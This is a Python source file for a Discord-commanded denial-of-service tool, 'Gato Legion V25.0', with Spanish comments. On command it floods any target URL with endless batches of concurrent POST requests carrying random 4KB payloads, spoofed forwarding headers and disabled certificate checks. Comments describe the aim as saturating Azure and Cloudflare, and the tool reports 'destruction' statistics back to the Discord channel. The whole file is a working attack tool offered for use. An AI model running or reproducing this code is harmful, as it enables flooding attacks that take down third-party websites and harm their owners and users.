import subprocess, sys, os, time

# --- AUTO-INSTALLER ---
def setup():
    libs = ["aiohttp", "discord.py", "colorama", "psutil"]
    os.system('cls' if os.name == 'nt' else 'clear')
    for lib in libs:
        try: __import__(lib)
        except ImportError:
            print(f"📦 Instalando recurso crítico: {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])

setup()

import asyncio, aiohttp, ssl, random, discord, psutil
from discord.ext import commands
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURACIÓN ---
os.system('cls' if os.name == 'nt' else 'clear')
print(f"{Fore.CYAN}🐱 GATO LEGION V25.0 | INTERACTIVE MULTI-VM C2")
TOKEN_INPUT = input(f"{Fore.WHITE}👉 Token del Bot: ").strip()

stats = {"hits": 0, "525": 0, "522": 0, "active": False, "target": "", "method": "mix"}

class GatoC2(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)

    async def on_ready(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.GREEN}✅ SISTEMA OPERATIVO EN 7 VMs")
        print(f"{Fore.CYAN}👑 C2 MASTER: {self.user}")

    async def attack_engine(self):
        while stats["active"]:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Cipher Suite optimizado para saturar Azure y Cloudflare
            ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
            
            conn = aiohttp.TCPConnector(ssl=ctx, limit=0, ttl_dns_cache=600)
            async with aiohttp.ClientSession(connector=conn) as session:
                while stats["active"]:
                    tasks = [self.fire_payload(session) for _ in range(200)]
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.001)

    async def fire_payload(self, session):
        # Payload de 4KB para forzar el límite de Azure
        garbage = os.urandom(4096).hex()
        headers = {
            "User-Agent": f"GatoLegion/25.0 (C2Pmiv; Microsoft_Bypass; {random.getrandbits(16)})",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.1.1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive"
        }
        url = f"{stats['target']}?id={random.getrandbits(64)}&ms={time.time()}"
        
        try:
            # MÉTODO MIXTO: Ataca la memoria (Azure) y el CPU (SSL/TLS)
            async with session.post(url, headers=headers, data={"azure_payload": garbage}, timeout=7) as r:
                stats["hits"] += 1
                if r.status in [502, 503, 525, 522]: stats["525"] += 1
        except:
            stats["522"] += 1

bot = GatoC2()

@bot.command()
async def on(ctx, url):
    if stats["active"]: return await ctx.send("⚠️ Ataque ya en curso.")
    stats["target"] = url if url.startswith("http") else f"https://{url}"
    stats["active"] = True
    stats["hits"], stats["525"], stats["522"] = 0, 0, 0
    
    embed = discord.Embed(title="🚀 ASALTO MASIVO (7 VMs ACTIVAS)", color=0xff0000)
    embed.add_field(name="🎯 TARGET", value=f"`{stats['target']}`", inline=False)
    embed.add_field(name="🔋 MODO", value="`Azure/Cloudflare Deep-Shred`", inline=True)
    msg_update = await ctx.send(embed=embed)
    
    asyncio.create_task(bot.attack_engine())
    
    while stats["active"]:
        await asyncio.sleep(60)
        if not stats["active"]: break
        # Cálculo de RAM usada en la VM actual
        ram = psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
        
        new_embed = discord.Embed(title="📊 LOGS DE DESTRUCCIÓN REAL", color=0x00ff00)
        new_embed.add_field(name="💀 Errores (525/503)", value=f"`{stats['525']}`", inline=True)
        new_embed.add_field(name="📉 Timeouts", value=f"`{stats['522']}`", inline=True)
        new_embed.add_field(name="🧠 RAM Usada", value=f"`{int(ram)} MB`", inline=True)
        new_embed.add_field(name="🚀 Hits", value=f"`{stats['hits']}`", inline=False)
        try: await msg_update.edit(embed=new_embed)
        except: break

@bot.command()
async def off(ctx):
    stats["active"] = False
    await ctx.send("🛑 **OPERACIÓN FINALIZADA.**")

bot.run(TOKEN_INPUT)
        
